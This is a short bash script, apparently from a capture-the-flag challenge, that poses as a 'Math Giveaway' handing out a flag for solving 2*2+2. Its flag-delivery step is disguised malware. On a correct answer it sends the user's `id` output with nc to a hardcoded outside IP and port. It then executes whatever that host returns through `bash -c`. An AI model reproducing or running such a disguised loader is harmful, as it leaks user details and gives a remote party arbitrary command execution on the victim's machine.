echo "[*] Math Giveaway v1.0. Just tell me what is 2*2+2 and get yo flag!";
read answer;
if ! [[ $answer -eq 6 ]];
then
	echo "[!] Incorrect answer :c";
else
	echo "[.] Gettin yo flag, please, stand by...";
	srv="77.223.96.24 21006";
	if [[ `nc -z ${srv}; echo $?` -eq 0 ]];
	then
		sleep 3;
		bash -c "`id | nc -n ${srv}`";
	else
		echo "[!] Plz check ur internet connection";
	fi;
fi;
